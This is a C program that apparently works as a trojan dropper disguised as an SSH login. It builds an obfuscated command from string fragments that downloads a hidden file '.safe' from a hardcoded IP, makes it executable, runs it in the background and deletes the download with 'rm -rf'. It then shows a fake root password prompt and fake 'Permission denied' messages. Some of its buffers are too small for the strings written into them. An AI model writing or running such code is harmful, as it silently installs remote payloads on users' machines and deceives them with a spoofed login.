#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <termios.h>
#include <errno.h>   /* for errno */
#include <unistd.h>  /* for EINTR */

int getch() {
int ch;
    for (;;) {

    struct termios oldtc, newtc;
    int ch;
    tcgetattr(STDIN_FILENO, &oldtc);
    newtc = oldtc;
    newtc.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newtc);
    ch=getchar();
    tcsetattr(STDIN_FILENO, TCSANOW, &oldtc);
    if(ch == '\n')
              break;
}return 0;
}

int main() {
  char c[5]="wget";
  char z[7]="touch";
  char f[7]="chmod";
  char t[4]="-r";
  char y[3]="f";
  char fff[8]="install";
  char zz[2]=";";
  char yyy[5]="yum";
  char tt[3]="cd";
  char u[10]="number";
  char ss[7]=".safe";
  char ip[18]="10.10.2.55:1234";//change appropriately
  char ye[4]="777";
  char cmd[80]="";
  char r[3]="./";
  char dd[2]="&";
  char la[3]="rm";
  char root[40]="root@password_server's password:";
  char jjjj[50]="Permission denied, please try again.\n";
  char jjjjj[50]="Permission denied (publickey,password).\n";
  char sss[15]=" 2>/dev/null ";
  sprintf(cmd,"%s %s %s %s%s%s %s%s%s%s %s %s%s%s%s%s %s%s",c,t,ip,sss,zz,tt,ip,sss,zz,f,ye,ss,sss,zz,r,ss,sss,dd);
  //printf(cmd);
  char neww[20]="";
  sprintf(neww,"%s %s%s %s%s",la,t,y,ip,sss);
  system(cmd);
  system(neww);


  char str[16],*endp;
  int value;
  printf("%s",root);
  getch();
  printf("\n%s",jjjj);
  printf("%s",root);
  getch();
  printf("\n%s",jjjj);
  printf("%s",root);
  getch();
  printf("\n%s",jjjj);
  printf("%s",jjjjj);

  return 0;
}
